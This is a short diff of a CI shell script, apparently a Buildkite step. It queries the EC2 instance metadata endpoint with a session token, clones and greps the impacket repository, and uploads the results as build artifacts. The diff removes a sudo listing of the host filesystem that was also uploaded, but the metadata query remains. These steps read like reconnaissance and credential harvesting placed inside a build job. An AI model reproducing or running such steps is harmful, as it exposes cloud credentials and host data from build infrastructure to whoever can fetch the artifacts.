@@ -14,7 +14,6 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta
 
 WORK_DIR=`mktemp -d -p "/tmp"`
 RES='grep_results.txt'
-DIRBROWSE='/tmp/dir_browse.txt'
 
 git clone https://github.com/fortra/impacket.git "$WORK_DIR"
 
@@ -22,14 +21,10 @@ tar -zcvf /tmp/artifacts.tar.gz "$WORK_DIR"
 
 grep -irn "__output" $WORK_DIR > $RES
 
-sudo find / -maxdepth 3 -ls > $DIRBROWSE
-
 rm -rf "$WORK_DIR"
 
 buildkite-agent artifact upload /tmp/artifacts.tar.gz
 buildkite-agent artifact upload $RES
-buildkite-agent artifact upload $DIRBROWSE
 
 rm /tmp/artifacts.tar.gz
 rm $RES
-rm $DIRBROWSE
